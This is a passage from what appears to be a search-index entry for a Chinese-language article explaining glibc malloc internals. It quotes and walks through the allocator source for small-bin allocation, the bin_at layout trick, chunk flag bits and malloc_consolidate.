<pre><code>// in _int_malloc\nif (in_smallbin_range (nb))\n  {\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n      {\n        bck = victim-&gt;bk;\n        if (__glibc_unlikely (bck-&gt;fd != victim))\n          malloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n        set_inuse_bit_at_offset (victim, nb);\n        bin-&gt;bk = bck;\n        bck-&gt;fd = bin;\n\n        if (av != &amp;main_arena)\n          set_non_main_arena (victim);\n        check_malloced_chunk (av, victim, nb);\n        /* While we're here, if we see other chunks of the same size,\n           stash them in the tcache.  */\n        size_t tc_idx = csize2tidx (nb);\n        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\n          {\n            mchunkptr tc_victim;\n\n            /* While bin not empty and tcache not full, copy chunks over.  */\n            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\n                   &amp;&amp; (tc_victim = last (bin)) != bin)\n              {\n                if (tc_victim != 0)\n                  {\n                    bck = tc_victim-&gt;bk;\n                    set_inuse_bit_at_offset (tc_victim, nb);\n                    if (av != &amp;main_arena)\n                      set_non_main_arena (tc_victim);\n                    bin-&gt;bk = bck;\n                    bck-&gt;fd = bin;\n\n                    tcache_put (tc_victim, tc_idx);\n                  }\n              }\n          }\n        void *p = chunk2mem (victim);\n        alloc_perturb (p, bytes);\n        return p;\n      }\n  }\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u4f7f\u7528\u200b <code>in_smallbin_range (nb)</code> \u200b\u68c0\u67e5\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u5426\u200b\u5e94\u8be5\u200b\u653e\u5230\u200b small bin \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u4f7f\u7528\u200b <code>smallbin_index (nb)</code> \u200b\u6839\u636e\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u8ba1\u7b97\u200b\u51fa\u200b small bin \u200b\u7684\u200b index\uff0c\u200b\u7136\u540e\u200b <code>bin_at (av, idx)</code> \u200b\u5bf9\u5e94\u200b small bin \u200b\u7684\u200b\u94fe\u8868\u200b\u5c3e\u90e8\u200b\u7684\u200b\u54e8\u5175\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u6709\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u54e8\u5175\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u54e8\u5175\u200b\u5c31\u200b\u653e\u5728\u200b small bin \u200b\u6570\u7ec4\u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u627e\u5230\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u7684\u200b\u524d\u9a71\u200b\u7ed3\u70b9\u200b <code>last (bin)</code>\uff0c\u200b\u5982\u679c\u200b\u94fe\u8868\u200b\u4e3a\u7a7a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u54e8\u5175\u200b\u7684\u200b\u524d\u9a71\u200b\u7ed3\u70b9\u200b\u5c31\u662f\u200b\u5b83\u200b\u81ea\u5df1\u200b\uff1b\u200b\u5982\u679c\u200b\u94fe\u8868\u200b\u975e\u7a7a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u54e8\u5175\u200b\u7684\u200b\u524d\u9a71\u200b\u7ed3\u70b9\u200b\u5c31\u662f\u200b\u94fe\u8868\u200b\u91cc\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u8d4b\u503c\u200b\u7ed9\u200b <code>victim</code></li> <li>\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\uff1a<code>set_inuse_bit_at_offset (victim, nb)</code></li> <li>\u200b\u628a\u200b <code>victim</code> \u200b\u4ece\u200b\u94fe\u8868\u200b\u91cc\u200b\u5220\u9664\u200b\uff1a<code>bck = victim-&gt;bk; bin-&gt;bk = bck; bck-&gt;fd = bin;</code>\uff0c\u200b\u5178\u578b\u200b\u7684\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u7ed3\u70b9\u200b\u5220\u9664\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u7ef4\u62a4\u200b <code>victim</code> \u200b\u524d\u9a71\u200b\u7ed3\u70b9\u200b\u7684\u200b\u540e\u7ee7\u200b\u6307\u9488\u200b\uff0c\u200b\u7ef4\u62a4\u200b\u54e8\u5175\u200b <code>bin</code> \u200b\u7684\u200b\u524d\u9a71\u200b\u6307\u9488\u200b</li> <li>\u200b\u8fdb\u884c\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u5b89\u5168\u68c0\u67e5\u200b\uff1a<code>check_malloced_chunk</code></li> <li>\u200b\u68c0\u67e5\u200b tcache \u200b\u5bf9\u5e94\u200b\u7684\u200b bin\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u6ee1\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b small bin \u200b\u94fe\u8868\u200b\u4e2d\u200b\u7684\u200b\u5143\u7d20\u200b\u632a\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u628a\u200b payload \u200b\u5730\u5740\u200b\u901a\u8fc7\u200b <code>chunk2mem</code> \u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u8fd4\u56de\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b</li> <li>\u200b\u8c03\u7528\u200b <code>alloc_perturb</code> \u200b\u5f80\u65b0\u200b\u5206\u914d\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5185\u200b\u5199\u5165\u200b\u5783\u573e\u200b\u6570\u636e\u200b\uff08\u200b\u53ef\u200b\u9009\u200b\uff09\uff0c\u200b\u907f\u514d\u200b\u6cc4\u9732\u200b\u4e4b\u524d\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u5176\u200b\u5b9e\u73b0\u200b\u8fc7\u7a0b\u200b\u548c\u200b fast bin \u200b\u5f88\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u628a\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u6539\u6210\u200b\u4e86\u200b\u53cc\u5411\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5f15\u5165\u200b\u4e86\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>malloc_state</code> \u200b\u7ed3\u6784\u200b\u7684\u200b bins \u200b\u6570\u7ec4\u200b\u5f53\u4e2d\u200b\uff1a</p> <pre><code>#define NSMALLBINS         64\n/* SMALLBIN_WIDTH equals to 16 on 64-bit */\n#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT\n/* SMALLBIN_CORRECTION equals to 0 on 64-bit */\n#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)\n\n/* MIN_LARGE_SIZE equals to 1024 on 64-bit */\n#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)\n\n/* equivalent to (sz &lt; 1024) on 64-bit */\n#define in_smallbin_range(sz)  \\\n  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)\n\n/* equivalent to (sz &gt;&gt; 4) on 64-bit */\n#define smallbin_index(sz) \\\n  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\\\n   + SMALLBIN_CORRECTION)\n\ntypedef struct malloc_chunk* mchunkptr;\n\n/* addressing -- note that bin_at(0) does not exist */\n#define bin_at(m, i) \\\n  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \\\n             - offsetof (struct malloc_chunk, fd))\n\n#define NBINS             128\nstruct malloc_state\n{\n  /* omitted */\n  /* Normal bins packed as described above */\n  mchunkptr bins[NBINS * 2 - 2];\n}\n</code></pre> <p>\u200b\u4e4d\u4e00\u770b\u200b\u4f1a\u200b\u89c9\u5f97\u200b\u5f88\u200b\u5947\u602a\u200b\uff0c\u200b\u8fd9\u91cc\u200b <code>NBINS * 2 - 2</code> \u200b\u662f\u200b\u4ec0\u4e48\u200b\u610f\u601d\u200b\uff1f<code>mchunkptr</code> \u200b\u662f\u200b\u4e2a\u200b\u6307\u9488\u200b\u7c7b\u578b\u200b\uff0c\u200b\u90a3\u200b\u5b83\u200b\u6307\u5411\u200b\u7684\u200b\u6570\u636e\u200b\u5b58\u5728\u200b\u54ea\u200b\uff1f\u200b\u5176\u5b9e\u200b\u8fd9\u91cc\u200b\u7528\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b trick\uff1a</p> <ol> <li>\u200b\u4e0d\u53bb\u200b\u770b\u200b bins \u200b\u5143\u7d20\u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u53ea\u200b\u8003\u8651\u200b\u5b83\u200b\u7684\u200b\u5143\u7d20\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u5927\u5c0f\u200b\u662f\u200b <code>sizeof(size_t)</code>\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b <code>NBINS * 2 - 2</code> \u200b\u4e2a\u200b\u5143\u7d20\u200b</li> <li>\u200b\u800c\u200b\u6bcf\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u94fe\u8868\u200b\u7684\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u7531\u4e8e\u200b\u662f\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u524d\u9a71\u200b\u548c\u200b\u540e\u7ee7\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\uff0c\u200b\u5373\u200b\u6bcf\u4e2a\u200b bin \u200b\u53ea\u200b\u9700\u8981\u200b\u5b58\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b <code>2 * sizeof(size_t)</code></li> <li>\u200b\u6b63\u597d\u200b <code>bins</code> \u200b\u6570\u7ec4\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b bin \u200b\u7559\u51fa\u200b\u4e86\u200b <code>2 * sizeof(size_t)</code> \u200b\u7684\u200b\u7a7a\u95f4\u200b\uff08bin 0 \u200b\u9664\u5916\u200b\uff0c\u200b\u8fd9\u4e2a\u200b bin \u200b\u4e0d\u200b\u5b58\u5728\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u4e0a\u200b\u8fd9\u4e9b\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u7684\u200b\u524d\u9a71\u200b\u548c\u200b\u540e\u7ee7\u200b\u6307\u9488\u200b\u5c31\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>bins</code> \u200b\u6570\u7ec4\u200b\u91cc\u200b\uff0c\u200b\u6309\u200b\u987a\u5e8f\u200b\u4fdd\u5b58\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b bin 1 \u200b\u7684\u200b\u524d\u9a71\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b bin 1 \u200b\u7684\u200b\u540e\u7ee7\u200b\uff0c\u200b\u63a5\u7740\u200b\u662f\u200b bin 2 \u200b\u7684\u200b\u524d\u9a71\u200b\uff0c\u200b\u4f9d\u6b64\u7c7b\u63a8\u200b</li> <li>\u200b\u867d\u7136\u200b\u7a7a\u95f4\u200b\u5bf9\u200b\u4e0a\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u4f7f\u7528\u200b\uff0c\u200b\u4ee3\u7801\u200b\u91cc\u200b\u7528\u200b <code>bin_at</code> \u200b\u5b8f\u6765\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e00\u4e2a\u200b <code>malloc_chunk</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u800c\u200b\u5df2\u77e5\u200b bins \u200b\u6570\u7ec4\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u4e86\u200b <code>fd</code> \u200b\u548c\u200b <code>bk</code> \u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\uff0c\u200b\u5e76\u4e14\u200b bin \u200b\u7684\u200b\u4e0b\u6807\u200b\u4ece\u200b 1 \u200b\u5f00\u59cb\u200b\uff0c\u200b\u6240\u4ee5\u200b bin i \u200b\u7684\u200b <code>fd</code> \u200b\u6307\u9488\u200b\u5730\u5740\u200b\u5c31\u662f\u200b <code>(char *) &amp;((m)-&gt;bins[((i) - 1) * 2])</code>\uff0c\u200b\u518d\u200b\u51cf\u53bb\u200b <code>malloc_chunk</code> \u200b\u7ed3\u6784\u200b\u4f53\u4e2d\u200b <code>fd</code> \u200b\u6210\u5458\u200b\u7684\u200b\u504f\u79fb\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b <code>malloc_chunk</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ed3\u6784\u200b\u4f53\u200b\u53ea\u6709\u200b <code>fd</code> \u200b\u548c\u200b <code>bk</code> \u200b\u4e24\u4e2a\u200b\u5b57\u6bb5\u200b\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b\uff0c\u200b\u5176\u4ed6\u200b\u5b57\u200b\u6bb5\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u8bbf\u95ee\u200b\u5230\u200b\u5176\u4ed6\u200b bin \u200b\u90a3\u91cc\u200b\u53bb\u200b</li> </ol> <p>\u200b\u629b\u5f00\u200b\u8fd9\u4e9b\u200b trick\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u200b\u7b49\u4ef7\u200b\u4e8e\u7528\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u6bcf\u4e2a\u200b bin \u200b\u7684\u200b <code>fd</code> \u200b\u548c\u200b <code>bk</code> \u200b\u6307\u9488\u200b\uff0c\u200b\u81f3\u4e8e\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u5f3a\u884c\u200b\u8f6c\u6362\u6210\u200b <code>malloc_chunk</code> \u200b\u7c7b\u578b\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\u4ee3\u7801\u200b\u7684\u200b\u7f16\u5199\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u533a\u5206\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u7ed3\u70b9\u200b\u548c\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0csmall bin \u200b\u7684\u200b\u5904\u7406\u200b\u91cc\u200b\u8fd8\u200b\u591a\u200b\u4e86\u200b\u4e00\u6b21\u200b <code>set_inuse_bit_at_offset (victim, nb)</code>\uff0c\u200b\u5b83\u200b\u7684\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>#define set_inuse_bit_at_offset(p, s)                                              \\\n  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)\n</code></pre> <p>\u200b\u4e4d\u4e00\u770b\u200b\u4f1a\u200b\u89c9\u5f97\u200b\u5f88\u200b\u5947\u602a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbf\u95ee\u200b\u4e0d\u662f\u200b\u8d8a\u754c\u200b\u4e86\u200b\u5417\u200b\uff1f\u200b\u5176\u5b9e\u200b\u8fd9\u4e2a\u200b\u5c31\u662f\u200b\u8de8\u8fc7\u200b\u5f53\u524d\u200b\u7684\u200b chunk\uff0c\u200b\u8bbf\u95ee\u200b\u76f8\u90bb\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b chunk\uff0c\u200b\u5728\u200b\u5b83\u200b\u7684\u200b <code>mchunk_size</code> \u200b\u5b57\u6bb5\u200b\u4e0a\u200b\u6253\u200b\u6807\u8bb0\u200b\uff0c\u200b\u8868\u793a\u200b\u5b83\u200b\u7684\u200b\u524d\u200b\u4e00\u4e2a\u200b chunk \u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5360\u7528\u200b\u3002\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0c<code>mchunk_size</code> \u200b\u540c\u65f6\u200b\u4fdd\u5b58\u200b\u4e86\u200b chunk \u200b\u7684\u200b\u5927\u5c0f\u200b\u548c\u200b\u4e00\u4e9b\u200b flag\uff0c\u200b\u7531\u4e8e\u200b chunk \u200b\u7684\u200b\u5927\u5c0f\u200b\u81f3\u5c11\u200b\u662f\u200b 8 \u200b\u5b57\u8282\u200b\u5bf9\u9f50\u200b\u7684\u200b\uff0832 \u200b\u4f4d\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u6700\u4f4e\u200b\u7684\u200b 3 \u200b\u4f4d\u200b\u5c31\u200b\u88ab\u200b\u62ff\u6765\u200b\u4fdd\u5b58\u200b\u5982\u4e0b\u200b\u7684\u200b flag\uff1a</p> <ol> <li><code>PREV_INUSE(0x1)</code>: \u200b\u524d\u200b\u4e00\u4e2a\u200b chunk \u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5206\u914d\u200b</li> <li><code>IS_MAPPED(0x2)</code>\uff1a\u200b\u5f53\u524d\u200b chunk \u200b\u7684\u200b\u5185\u5b58\u200b\u6765\u81ea\u200b\u4e8e\u200b mmap</li> <li><code>NON_MAIN_ARENA(0x4)</code>\uff1a\u200b\u5f53\u524d\u200b chunk \u200b\u6765\u81ea\u200b\u4e8e\u200b main arena \u200b\u4ee5\u5916\u200b\u7684\u200b\u5176\u4ed6\u200b arena</li> </ol> <p>\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff0c\u200b\u5c31\u662f\u200b\u8bbe\u7f6e\u200b\u4e86\u200b <code>PREV_INUSE</code> flag\uff0c\u200b\u65b9\u4fbf\u200b\u540e\u7eed\u200b\u7684\u200b\u76f8\u90bb\u200b\u5757\u200b\u7684\u200b\u5408\u5e76\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0csmall bin \u200b\u7684\u200b\u5206\u914d\u200b\u8303\u56f4\u200b\u662f\u200b <code>nb &lt; MIN_LARGE_SIZE</code>\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b 64 \u200b\u4f4d\u4e0a\u200b\uff0c<code>malloc(1000)</code> \u200b\u6216\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5206\u914d\u200b\u4f1a\u200b\u88ab\u200b small bin \u200b\u5206\u914d\u200b\uff0c\u200b\u800c\u200b <code>malloc(1001)</code> \u200b\u6216\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u5206\u914d\u200b\u5219\u200b\u4e0d\u200b\u53ef\u4ee5\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#free_2","title":"free","text":"<p>\u200b\u5728\u200b\u8bb2\u8ff0\u200b small bin \u200b\u5728\u200b free \u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e4b\u524d\u200b\uff0c\u200b\u5148\u200b\u8ba8\u8bba\u200b <code>_int_malloc</code> \u200b\u7684\u200b\u540e\u7eed\u200b\u903b\u8f91\u200b\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u56de\u8fc7\u5934\u6765\u200b\u770b\u200b free \u200b\u7684\u200b\u90e8\u5206\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#consolidate","title":"consolidate","text":"<p>\u200b\u5f53\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7ecf\u8fc7\u200b fast bin \u200b\u548c\u200b small bin \u200b\u4e24\u6bb5\u200b\u903b\u8f91\u200b\u90fd\u200b\u6ca1\u80fd\u200b\u5206\u914d\u200b\u6210\u529f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u65f6\u5019\u200b\uff08<code>!in_small_range (nb)</code>\uff09\uff0c\u200b\u4f1a\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b <code>malloc_consolidate</code> \u200b\u8c03\u7528\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u51fd\u6570\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u5bf9\u200b fast bin \u200b\u4e2d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u65b0\u200b\u7684\u200b\u5757\u200b\u63d2\u5165\u200b\u5230\u200b unsorted bin \u200b\u5f53\u4e2d\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>unsorted_bin = unsorted_chunks(av);\nmaxfb = &amp;fastbin (av, NFASTBINS - 1);\nfb = &amp;fastbin (av, 0);\ndo {\n  p = atomic_exchange_acq (fb, NULL);\n  if (p != 0) {\n    do {\n      /* malloc check omitted */\n\n      check_inuse_chunk(av, p);\n      nextp = p-&gt;fd;\n\n      /* Slightly streamlined version of consolidation code in free() */\n      size = chunksize (p);\n      nextchunk = chunk_at_offset(p, size);\n      nextsize = chunksize(nextchunk);\n\n      if (!prev_inuse(p)) {\n        prevsize = prev_size (p);\n        size += prevsize;\n        p = chunk_at_offset(p, -((long) prevsize));\n        /* malloc check omitted */\n        unlink_chunk (av, p);\n      }\n\n      if (nextchunk != av-&gt;top) {\n        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n        if (!nextinuse) {\n          size += nextsize;\n          unlink_chunk (av, nextchunk);\n        } else\n          clear_inuse_bit_at_offset(nextchunk, 0);\n\n        first_unsorted = unsorted_bin-&gt;fd;\n        unsorted_bin-&gt;fd = p;\n        first_unsorted-&gt;bk = p;\n\n        if (!in_smallbin_range (size)) {\n          p-&gt;fd_nextsize = NULL;\n          p-&gt;bk_nextsize = NULL;\n        }\n\n        set_head(p, size | PREV_INUSE);\n        p-&gt;bk = unsorted_bin;\n        p-&gt;fd = first_unsorted;\n        set_foot(p, size);\n      }\n\n      else {\n        size += nextsize;\n        set_head(p, size | PREV_INUSE);\n        av-&gt;top = p;\n      }\n\n    } while ( (p = nextp) != 0);\n\n  }\n} while (fb++ != maxfb);\n</code></pre> <ol> <li>\u200b\u7b2c\u4e00\u5c42\u200b\u5faa\u73af\u200b\uff0c\u200b\u904d\u5386\u200b\u6bcf\u4e2a\u200b\u975e\u7a7a\u200b\u7684\u200b fast bin\uff0c\u200b\u8fdb\u884c\u200b\u4e0b\u5217\u200b\u64cd\u4f5c\u200b</li> <li>\u200b\u7b2c\u4e8c\u5c42\u200b\u5faa\u73af\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u975e\u7a7a\u200b\u7684\u200b fast bin \u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u6cbf\u7740\u200b\u94fe\u8868\u200b\u8fdb\u884c\u200b\u8fed\u4ee3\u200b\uff0c\u200b\u904d\u5386\u200b\u94fe\u8868\u200b\u4e0a\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e0b\u5217\u200b\u64cd\u4f5c\u200b</li> <li>\u200b\u5faa\u73af\u200b\u5185\u90e8\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u80fd\u5426\u200b\u548c\u200b\u524d\u540e\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5408\u5e76\u200b</li> <li>\u200b\u9996\u5148\u200b\u68c0\u67e5\u200b\u5728\u200b\u5b83\u200b\u524d\u9762\u200b\uff08\u200b\u5730\u5740\u200b\u66f4\u200b\u4f4e\u200b\u7684\u200b\uff09\u200b\u76f8\u90bb\u200b\u7684\u200b\u5757\u200b\u662f\u5426\u200b\u7a7a\u95f2\u200b\uff1a\u200b\u5982\u679c\u200b <code>PREV_INUSE</code> \u200b\u6ca1\u6709\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>mchunk_prev_size</code> \u200b\u627e\u5230\u200b\u524d\u9762\u200b\u76f8\u90bb\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u4e24\u4e2a\u200b\u5757\u200b\u5408\u5e76\u200b\u8d77\u6765\u200b\uff1b\u200b\u5982\u679c\u200b\u524d\u9762\u200b\u76f8\u90bb\u200b\u7684\u200b\u5757\u200b\u5df2\u7ecf\u200b\u5728\u200b\u67d0\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\uff08\u200b\u4f8b\u5982\u200b small bin\uff09\uff0c\u200b\u628a\u200b\u5b83\u200b\u4ece\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\u5220\u9664\u200b\uff1a<code>unlink_chunk (av, p);</code>\uff1b\u200b\u4e3a\u4ec0\u4e48\u200b\u524d\u9762\u200b\u8981\u200b\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e3a\u4e86\u200b\u5728\u200b\u8fd9\u91cc\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u94fe\u8868\u200b\u4e2d\u95f4\u200b\u5220\u9664\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b</li> <li>\u200b\u63a5\u7740\u200b\u68c0\u67e5\u200b\u5728\u200b\u5b83\u200b\u540e\u9762\u200b\uff08\u200b\u5730\u5740\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\uff09\u200b\u76f8\u90bb\u200b\u7684\u200b\u5757\u200b\u662f\u5426\u200b\u7a7a\u95f2\u200b\uff1a\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b size\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u518d\u200b\u8bfb\u53d6\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\uff0c\u200b\u6839\u636e\u200b\u5b83\u200b\u7684\u200b <code>PREV_INUSE</code>\uff0c\u200b\u5224\u65ad\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\u662f\u5426\u200b\u7a7a\u95f2\u200b\uff1b\u200b\u5982\u679c\u200b\u7a7a\u95f2\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5757\u200b\u4e5f\u200b\u5408\u5e76\u200b\u8fdb\u6765\u200b\uff0c\u200b\u540c\u7406\u200b\u4e5f\u200b\u8981\u200b\u628a\u200b\u5b83\u200b\u4ece\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\u5220\u9664\u200b\uff1a<code>unlink_chunk (av, nextchunk);</code>\uff1b\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u8fd8\u6709\u200b\u5bf9\u200b top chunk \u200b\u7684\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5148\u200b\u7565\u8fc7\u200b</li> <li>\u200b\u5408\u5e76\u200b\u5b8c\u6210\u200b\u4ee5\u540e\u200b\uff0c\u200b\u628a\u200b\u5f53\u524d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b unsorted bin 